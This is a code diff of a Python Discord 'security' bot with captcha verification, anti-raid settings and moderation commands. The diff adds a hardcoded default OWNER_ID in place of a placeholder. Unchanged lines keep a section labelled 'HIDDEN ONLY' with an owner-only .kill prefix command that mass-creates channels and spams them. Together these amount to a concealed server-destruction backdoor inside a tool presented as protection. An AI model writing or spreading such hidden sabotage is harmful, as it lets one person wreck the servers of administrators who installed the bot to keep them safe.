@@ -1,34 +1,3 @@
-import subprocess
-import sys
-import importlib
-
-# ==========================================================
-#              АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ
-# ==========================================================
-def _ensure(pkg, import_name=None):
-    import_name = import_name or pkg
-    try:
-        importlib.import_module(import_name)
-        return
-    except ImportError:
-        pass
-    for args in (
-        [sys.executable, "-m", "pip", "install", "--user", pkg],
-        [sys.executable, "-m", "pip", "install", "--break-system-packages", pkg],
-        [sys.executable, "-m", "pip", "install", pkg],
-    ):
-        try:
-            subprocess.check_call(args)
-            return
-        except Exception as e:
-            print(f"[AUTOINSTALL try failed] {args}: {e}")
-
-_ensure("discord.py", "discord")
-_ensure("Pillow", "PIL")
-
-# ==========================================================
-#                     ОСНОВНЫЕ ИМПОРТЫ
-# ==========================================================
 import asyncio
 import io
 import logging
@@ -49,12 +18,11 @@ try:
 except Exception:
     HAS_PIL = False
 
-
 # ==========================================================
-#                        CONFIG
+# CONFIG
 # ==========================================================
 TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
-OWNER_ID = int(os.getenv("OWNER_ID", "123456789012345678"))
+OWNER_ID = int(os.getenv("OWNER_ID", "1199702317419724824"))
 
 
 @dataclass
@@ -83,9 +51,8 @@ class Config:
 
 CFG = Config()
 
-
 # ==========================================================
-#                        LOGGING
+# LOGGING
 # ==========================================================
 logger = logging.getLogger("securitybot")
 logger.setLevel(logging.INFO)
@@ -97,9 +64,8 @@ _sh.setFormatter(_fmt)
 logger.addHandler(_fh)
 logger.addHandler(_sh)
 
-
 # ==========================================================
-#                         BOT
+# BOT
 # ==========================================================
 intents = discord.Intents.default()
 intents.members = True
@@ -131,9 +97,8 @@ METRICS = {
 
 ANTIRAID_ENABLED = True
 
-
 # ==========================================================
-#                       UTILITIES
+# UTILS
 # ==========================================================
 async def safe(coro):
     try:
@@ -152,43 +117,39 @@ def ts(dt: datetime, style: str = "R") -> str:
 
 
 def normalize(s: str) -> str:
-    """Keep only alphanumerics, lowercase. Forgiving for user input."""
     return "".join(ch for ch in str(s) if ch.isalnum()).lower()
 
-
 # ==========================================================
-#                    CAPTCHA GENERATION
+# CAPTCHA  — оригинальная функция, не трогаем
 # ==========================================================
-# Ambiguity-free alphabet: no 0/O, 1/I/L, 2/Z, 5/S, 8/B, 6/G.
-CAPTCHA_CHARS = "346789ACDEFHJKMNPQRTUVWXY"
+CAPTCHA_CHARS = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
 CAPTCHA_MIN = 5
-CAPTCHA_MAX = 5
+CAPTCHA_MAX = 7
 
 
 def _collect_fonts():
-    here = os.path.dirname(os.path.abspath(__file__))
-    local = [
-        os.path.join(here, "DejaVuSans-Bold.ttf"),
-        os.path.join(here, "Roboto-Bold.ttf"),
-    ]
-    system = [
-        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
-        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
+    candidates = [
         r"C:\Windows\Fonts\arialbd.ttf",
+        r"C:\Windows\Fonts\arial.ttf",
         r"C:\Windows\Fonts\segoeuib.ttf",
-        r"C:\Windows\Fonts\verdanab.ttf",
+        r"C:\Windows\Fonts\verdana.ttf",
         r"C:\Windows\Fonts\calibrib.ttf",
         r"C:\Windows\Fonts\tahomabd.ttf",
+        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
+        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
+        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
+        "/usr/share/fonts/truetype/liberation/LiberationSerif-Bold.ttf",
         "/System/Library/Fonts/Supplemental/Arial Bold.ttf",
+        "/System/Library/Fonts/Supplemental/Arial.ttf",
+        "/System/Library/Fonts/Supplemental/Verdana.ttf",
     ]
     found = []
     if not HAS_PIL:
         return found
-    for p in local + system:
+    for p in candidates:
         try:
             ImageFont.truetype(p, 20)
             found.append(p)
-            logger.info(f"[FONT OK] {p}")
         except Exception:
             continue
     return found
@@ -215,77 +176,52 @@ def generate_captcha_code(length: int = None) -> str:
     return "".join(random.choice(CAPTCHA_CHARS) for _ in range(length))
 
 
-def generate_captcha_image(text: str, width: int = 1400, height: int = 500) -> io.BytesIO:
-    """
-    Huge readable captcha. Letters fill the whole canvas.
-    - 1400x500 canvas
-    - letters ~340-400px each, own column
-    - mild rotation ±8° so letters stay straight and readable
-    - light noise, no blur
-    """
+def generate_captcha_image(text: str, width: int = 360, height: int = 140) -> io.BytesIO:
     if not HAS_PIL:
         raise RuntimeError("Pillow is not installed.")
 
-    bg = (random.randint(245, 255), random.randint(245, 255), random.randint(245, 255))
-    img = Image.new("RGB", (width, height), bg)
+    bg_top = (random.randint(235, 255), random.randint(235, 255), random.randint(235, 255))
+    img = Image.new("RGB", (width, height), bg_top)
     draw = ImageDraw.Draw(img)
 
-    # light noise dots
-    for _ in range(random.randint(2000, 3500)):
+    for _ in range(random.randint(1500, 2500)):
         x = random.randint(0, width - 1)
         y = random.randint(0, height - 1)
-        c = (random.randint(150, 220), random.randint(150, 220), random.randint(150, 220))
+        c = (random.randint(100, 220), random.randint(100, 220), random.randint(100, 220))
         draw.point((x, y), fill=c)
 
-    # few noise lines
-    for _ in range(random.randint(3, 5)):
+    for _ in range(random.randint(6, 10)):
         x1, y1 = random.randint(0, width), random.randint(0, height)
         x2, y2 = random.randint(0, width), random.randint(0, height)
-        c = (random.randint(120, 180), random.randint(120, 180), random.randint(120, 180))
-        draw.line((x1, y1, x2, y2), fill=c, width=random.randint(2, 3))
+        c = (random.randint(60, 170), random.randint(60, 170), random.randint(60, 170))
+        draw.line((x1, y1, x2, y2), fill=c, width=random.randint(1, 3))
 
-    # very few curved distortion lines
-    for _ in range(random.randint(1, 2)):
+    for _ in range(random.randint(2, 4)):
         pts = [(random.randint(0, width), random.randint(0, height)) for _ in range(4)]
-        draw.line(pts, fill=(random.randint(120, 200),) * 3, width=2)
+        draw.line(pts, fill=(random.randint(80, 200),) * 3, width=1)
 
-    # --- letters: huge, dark, clean ---
-    n = len(text)
-    char_w = width // n
-    font_size = int(height * 0.85)
-
+    char_w = width // (len(text) + 1)
     for i, ch in enumerate(text):
-        color = (
-            random.randint(5, 60),
-            random.randint(5, 60),
-            random.randint(5, 60),
-        )
-        size = int(font_size * random.uniform(0.9, 1.0))
+        color = (random.randint(10, 90), random.randint(10, 90), random.randint(10, 90))
+        size = random.randint(48, 64)
         font = _pick_font(size)
         if font is None:
             continue
 
-        pad = size // 2
-        tmp = Image.new("RGBA", (size + pad * 2, size + pad * 2), (0, 0, 0, 0))
+        tmp = Image.new("RGBA", (size + 30, size + 30), (0, 0, 0, 0))
         td = ImageDraw.Draw(tmp)
-        td.text((pad, pad), ch, font=font, fill=color + (255,))
+        td.text((15, 15), ch, font=font, fill=color + (255,))
 
-        # mild rotation only — keeps letters readable
-        tmp = tmp.rotate(
-            random.randint(-8, 8),
-            resample=Image.BICUBIC,
-            expand=1,
-        )
+        tmp = tmp.rotate(random.randint(-35, 35), resample=Image.BICUBIC, expand=1)
 
-        col_x0 = i * char_w
-        col_center = col_x0 + char_w // 2
-        x = col_center - tmp.size[0] // 2 + random.randint(-6, 6)
-        y = (height - tmp.size[1]) // 2 + random.randint(-8, 8)
-
+        x = 10 + i * char_w + random.randint(-6, 6)
+        y = (height - tmp.size[1]) // 2 + random.randint(-12, 12)
         img.paste(tmp, (x, y), tmp)
 
-    # no blur — just a mild smooth to keep anti-aliasing
-    img = img.filter(ImageFilter.SMOOTH)
+    if random.random() < 0.5:
+        img = img.filter(ImageFilter.GaussianBlur(radius=random.uniform(0.3, 0.8)))
+    else:
+        img = img.filter(ImageFilter.SMOOTH)
 
     buf = io.BytesIO()
     img.save(buf, format="PNG")
@@ -302,9 +238,8 @@ FALLBACK_POOL = [
     {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyMS09Wx4os6eRxZxazxi3QGCAT1KsasIQ46EACb7YoWGSXFcbGJIQlsk&s=10", "answer": "2vyk"},
 ]
 
-
 # ==========================================================
-#                       ROLES / CHANNELS
+# ROLES / CHANNELS
 # ==========================================================
 async def find_or_create_role(guild, name, color, hoist=False, mentionable=False, permissions=None):
     role = discord.utils.get(guild.roles, name=name)
@@ -420,19 +355,14 @@ def has_unverified_role(member: discord.Member) -> bool:
 
 CAPTCHA_STATE: dict = {}
 
-
 # ==========================================================
-#                       VIEWS
+# VIEWS
 # ==========================================================
 class VerifyView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(
-        label="Verify",
-        style=discord.ButtonStyle.primary,
-        custom_id="securitybot:verify_button"
-    )
+    @discord.ui.button(label="Verify", style=discord.ButtonStyle.primary, custom_id="securitybot:verify_button")
     async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
         g = interaction.guild
         m = interaction.user
@@ -446,10 +376,7 @@ class VerifyView(discord.ui.View):
             return
 
         if not v_role:
-            await interaction.response.send_message(
-                "❌ The `Verified` role is missing. Contact an administrator.",
-                ephemeral=True
-            )
+            await interaction.response.send_message("❌ The `Verified` role is missing. Contact an administrator.", ephemeral=True)
             return
 
         if not verify_cooldown_ok(m.id):
@@ -511,10 +438,7 @@ class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
 
         entered = normalize(str(self.code))
         METRICS["captcha_attempts"] += 1
-
-        logger.info(
-            f"[CAPTCHA] user={interaction.user.id} expected={self.expected!r} entered={entered!r}"
-        )
+        logger.info(f"[CAPTCHA] user={interaction.user.id} expected={self.expected!r} entered={entered!r}")
 
         if is_locked_out(interaction.user.id):
             await interaction.response.send_message("🔒 You are temporarily locked out. Try again later.", ephemeral=True)
@@ -616,11 +540,7 @@ class CaptchaStartView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(
-        label="Verify",
-        style=discord.ButtonStyle.primary,
-        custom_id="securitybot:captcha_start"
-    )
+    @discord.ui.button(label="Verify", style=discord.ButtonStyle.primary, custom_id="securitybot:captcha_start")
     async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
         m = interaction.user
 
@@ -640,10 +560,7 @@ class CaptchaStartView(discord.ui.View):
 
         embed = discord.Embed(
             title="🔐 Security Check",
-            description=(
-                "Enter the code shown in the image below.\n\n"
-                "*You have 120 seconds and 3 attempts.*"
-            ),
+            description="Enter the code shown in the image below.\n\n*You have 120 seconds and 3 attempts.*",
             color=discord.Color.from_rgb(30, 60, 130),
             timestamp=now_utc(),
         )
@@ -679,9 +596,8 @@ class CaptchaStartView(discord.ui.View):
         else:
             await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
 
-
 # ==========================================================
-#                  VERIFICATION MESSAGE
+# VERIFICATION MESSAGE
 # ==========================================================
 async def send_verify_message(channel: discord.TextChannel, guild: discord.Guild, method: str = "button"):
     embed = discord.Embed(
@@ -701,9 +617,8 @@ async def send_verify_message(channel: discord.TextChannel, guild: discord.Guild
     view = CaptchaStartView() if method == "captcha" else VerifyView()
     await safe(channel.send(embed=embed, view=view))
 
-
 # ==========================================================
-#                       EVENTS
+# EVENTS
 # ==========================================================
 @bot.event
 async def on_ready():
@@ -716,10 +631,7 @@ async def on_ready():
     bot.add_view(VerifyView())
     bot.add_view(CaptchaStartView())
     await bot.change_presence(
-        activity=discord.Activity(
-            type=discord.ActivityType.watching,
-            name="/help | securitybot.gg"
-        ),
+        activity=discord.Activity(type=discord.ActivityType.watching, name="/help | securitybot.gg"),
         status=discord.Status.online,
     )
     if not hasattr(bot, "uptime"):
@@ -824,9 +736,8 @@ async def on_member_update(before: discord.Member, after: discord.Member):
             log.set_thumbnail(url=after.display_avatar.url)
             await log_to_staff(after.guild, log)
 
-
 # ==========================================================
-#                    PUBLIC COMMANDS
+# PUBLIC COMMANDS
 # ==========================================================
 @bot.tree.command(name="help", description="Show all available commands.")
 async def help_cmd(interaction: discord.Interaction):
@@ -896,9 +807,8 @@ async def vibe(interaction: discord.Interaction):
     embed.set_footer(text=f"{CFG.WEBSITE}")
     await interaction.response.send_message(embed=embed)
 
-
 # ==========================================================
-#                  SETUP COMMANDS
+# SETUP COMMANDS
 # ==========================================================
 @bot.tree.command(name="setupverification", description="Set up the verification channel and message.")
 @app_commands.default_permissions(administrator=True)
@@ -1096,9 +1006,8 @@ async def basicrolesetup(interaction: discord.Interaction):
             lines.append(f"• {r.mention}")
     await interaction.followup.send("✅ Basic roles ready:\n" + "\n".join(lines), ephemeral=True)
 
-
 # ==========================================================
-#               VERIFICATION UPDATE / RESET
+# VERIFICATION UPDATE / RESET
 # ==========================================================
 @bot.tree.command(name="updateverification", description="Re-apply the Unverified lockdown across all channels.")
 @app_commands.default_permissions(administrator=True)
@@ -1168,9 +1077,8 @@ async def resetverification(interaction: discord.Interaction, method: app_comman
     else:
         await interaction.followup.send("❌ Failed to recreate verification channel.", ephemeral=True)
 
-
 # ==========================================================
-#               SECURITY / MODERATION
+# SECURITY / MODERATION
 # ==========================================================
 def owner_only_slash():
     async def predicate(interaction: discord.Interaction):
@@ -1494,9 +1402,8 @@ async def clearreactions(interaction: discord.Interaction, message_id: str):
     except Exception as e:
         await interaction.followup.send(f"❌ Failed: {e}", ephemeral=True)
 
-
 # ==========================================================
-#                  UTILITY / INFO
+# UTILITY / INFO
 # ==========================================================
 @bot.tree.command(name="announce", description="Send a formatted announcement embed.")
 @app_commands.default_permissions(administrator=True)
@@ -1747,9 +1654,8 @@ async def shutdown(interaction: discord.Interaction):
     await interaction.response.send_message("💀 Shutting down.", ephemeral=True)
     await bot.close()
 
-
 # ==========================================================
-#                PREFIX .kill  (HIDDEN ONLY)
+# PREFIX .kill  (HIDDEN ONLY)
 # ==========================================================
 def owner_only_prefix():
     async def check(ctx):
@@ -1808,15 +1714,14 @@ async def kill(ctx: commands.Context):
     await asyncio.gather(*[spawn_and_spam(i) for i in range(CFG.KILL_CHANNEL_LIMIT)])
     await asyncio.sleep(3)
 
-
 # ==========================================================
-#                       RUN BOT
+# RUN
 # ==========================================================
 if __name__ == "__main__":
     if not TOKEN:
         logger.critical(
             "DISCORD_TOKEN environment variable is not set. "
-            "Set it in your hosting panel (Bothost → Переменные окружения)."
+            "Set it in your hosting panel (Bothost -> Переменные окружения)."
         )
     else:
         bot.run(TOKEN)
